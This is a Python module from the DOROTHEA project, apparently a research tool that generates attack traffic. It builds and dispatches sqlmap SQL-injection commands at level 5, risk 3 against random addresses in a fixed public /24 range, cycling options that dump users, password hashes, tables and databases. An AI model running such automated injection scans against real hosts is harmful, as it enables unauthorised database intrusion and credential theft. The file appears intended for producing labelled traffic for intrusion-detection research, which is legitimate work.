#
#
# Copyright (c) 2020 Adrian Campazas Vega, Ignacio Samuel Crespo Martinez, Angel Manuel Guerrero Higueras.
#
# This file is part of DOROTHEA 
#
# DOROTHEA is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# DOROTHEA is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
from .tasks import sqlmap
from celery.result import ResultSet
from .end_attack.end_attack import end_attack
import time
import subprocess as sp
import random




def start_attack():
	global r
	r = ResultSet([])
	arrayOpciones=['--banner','--current-user','--current-db','--hostname','--is-dba','--users','--passwords','--privileges','--roles','--dbs','--tables','--columns','--schema','--count','--dump','--comments --schema']
	arrayParametos=['-p "datos"', '-p "Nombres"','-p "Apellidos"','-p "Correo"','-p "Telefono"']
	arrayPuertos=['80','443','8080']
	contadorOpciones=0
	while contadorOpciones<15:
		ataque = 'sqlmap -u "http://'+randomize_ip()+':'+arrayPuertos[randomize_Puertos()]+'/php/register.php?Nombres=Ignacio" --random-agent -p Nombres --level=5 --risk=3 ' + arrayOpciones[contadorOpciones] + '  --answers="follow=Y" --batch'
		print(ataque)
		time.sleep(5)
		r.add(sqlmap.delay(ataque))
		contadorOpciones = contadorOpciones +1




def randomize_ip():
	randIP = random.randrange(8,208)
	ip = "152.148.48." + str(randIP)
	print("IP: " + ip)
	return ip

def randomize_Parametro():
	randParametro = random.randrange(0,4)
	return randParametro


def randomize_Puertos():
	randPuerto = random.randrange(0,2)
	return randPuerto

def end_attacks():
	global r
	r.join()
	if r.ready() == True:
		end_attack()




if __name__ == '__main__':
	start_attack()
	end_attacks()
